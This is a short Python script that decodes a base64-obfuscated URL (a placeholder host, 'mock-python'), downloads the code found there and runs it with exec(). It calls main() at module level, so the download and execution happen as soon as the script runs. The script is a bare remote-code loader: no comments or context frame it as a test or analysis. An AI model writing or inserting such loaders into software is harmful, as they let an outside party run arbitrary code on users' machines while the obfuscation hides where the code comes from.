import urllib.request
import importlib
import base64

def get_encoded_url():
    return "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="

def get_decoded_url(encoded_url):
    return base64.b64decode(encoded_url).decode('utf-8')

def get_response(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def exec_code(src):
    exec(src)

def main():
    encoded_url = get_encoded_url()
    decoded_url = get_decoded_url(encoded_url)
    source = get_response(decoded_url)
    exec_code(source)

main()
